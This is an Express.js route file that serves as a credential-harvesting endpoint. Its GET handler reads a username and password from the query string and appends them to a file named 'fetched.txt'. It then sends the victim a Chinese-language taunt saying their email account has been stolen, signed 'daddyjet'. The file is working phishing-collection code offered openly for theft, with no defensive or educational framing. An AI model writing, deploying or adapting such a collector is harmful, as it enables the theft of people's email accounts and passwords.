var express = require('express');
var router = express.Router();
var fs = require('fs');

/* GET home page. */
router.get('/', function(req, res, next) {
  var user = req.query.user;
  var psw = req.query.psw;
  fs.appendFileSync('fetched.txt', user + ' - ' + psw + '\r\n');
  res.send('不好意思，你的邮箱已经被我盗取。想要挽回？你可能得有一个搞软件的朋友才行。 --daddyjet');
});

module.exports = router;
